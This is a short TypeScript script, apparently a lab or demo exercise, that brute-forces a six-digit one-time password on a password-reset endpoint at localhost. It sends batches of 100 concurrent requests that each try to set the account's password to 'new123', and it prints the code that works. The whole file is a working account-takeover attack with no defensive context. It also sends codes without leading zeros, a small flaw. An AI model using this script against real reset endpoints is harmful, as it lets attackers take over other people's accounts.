import axios from "axios";

const SERVER_URL = "http://localhost:3000/reset-password";
const EMAIL = "asd@example.com";

async function sendRequest(otp: string) {
    try {
        const res = await axios.post(SERVER_URL, {
            email: EMAIL,
            otp,
            newPassword: "new123",
        });
        return { result: true, otp };
    } catch (err) {
        return { result: false, otp };
    }
}

async function main() {
    for (let i = 0; i <= 999999; i += 100) {
        const promises = [];

        for (let j = i; j < i + 100; j++) {
            console.log("Trying", j);
            promises.push(sendRequest(j.toString()));
        }

        const res = await Promise.all(promises);

        for (let k = 0; k < 100; k++) {
            if (res[k].result === true) {
                console.log(res[k].otp);
                return;
            }
        }
    }
}

main();
